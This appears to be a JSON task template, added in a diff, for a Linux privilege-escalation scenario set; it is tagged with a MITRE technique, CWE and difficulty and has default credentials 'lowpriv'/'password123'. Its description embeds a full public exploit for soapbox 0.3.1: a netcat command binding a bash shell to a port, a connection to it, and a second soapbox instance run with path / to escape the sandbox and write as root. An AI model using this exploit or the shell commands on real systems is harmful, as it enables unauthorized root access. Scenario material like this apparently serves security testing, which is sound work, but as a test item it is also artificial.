@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_21666",
+  "category": "C1_cron",
+  "attack_technique": "T1053.003",
+  "cwe": "CWE-732",
+  "description": "Linux privilege escalation: soapbox 0.3.1 - Local Privilege Escalation (OSVDB-87233)\n\nExploit source code (21666.txt):\n```\n-----------------------------------\nsoapbox 0.3.1 <= Local Root Exploit\n-----------------------------------\n\nVendor URI: http://dag.wieers.com/home-made/soapbox/\n\nCredit: Jean Pascal Pereira <pereira@secbiz.de>\n\nDescription:\n\n\"Soapbox allows to restrict processes to write only to those places you want. Read-access however is still based on file-permissions. By preloading the Soapbox library, you can run programs as root and monitor which writes/changes are made, without them really happening. (Typically 'make install')\n\nBeware this can be used for security-purposes, but it can deliberately be circumvented. Soapbox only impacts dynamically linked programs that properly use glibc functions. I'm currently looking into a safer implementation using ptrace.\n\nSoapbox also triggered some bugs in applications that trusted system calls too much. So you can use soapbox to test your programs for these kinds of mistakes too.\"\n\n------------------------------------------------------------------------------------------\n\n\nFirst of all, we have to run soapbox on our target system.\nI'm going to create a new netcat process spawned in a restricted directory (/etc/opt/sbx).\n\n------------------------------------------------------------------------------------------\nroot@havoc:/etc/opt/sbx# soapbox -l log -p /etc/opt/sbx /bin/nc -l -v -p 4545 -e /bin/bash\n------------------------------------------------------------------------------------------\n\nAfter establishing a connection to our target system, we get a sandboxed root shell.\nLet's try to write data to a protected location.\n\n------------------------------------------------------------------------------------------\n$ nc 23.5.0.0 4545\necho boom > /etc/abc\nbash: line 1: 1: Bad file descriptor\n------------------------------------------------------------------------------------------\n\nAs we can see, soapbox restricts write access to this path.\nBut what happens if we start another soapbox instance with full file-system access?\n\n------------------------------------------------------------------------------------------\n$ nc 23.5.0.0 4545\nsoapbox -l log -p / /bin/bash # running another instance of soapbox that provides full file system access\necho boom > /etc/abc\ncat /etc/abc\nboom # BOOM!\n------------------------------------------------------------------------------------------\n\nBOOM. Now we're able to start an unrestricted root shell and gain control over the file system.\n\n(This is still a local exploit because we were only able to exploit that issue remotely by using netcat).\n\n\n/* http://0xffe4.org */\n```",
+  "cve": "OSVDB-87233",
+  "exploitdb_id": "21666",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_21666",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
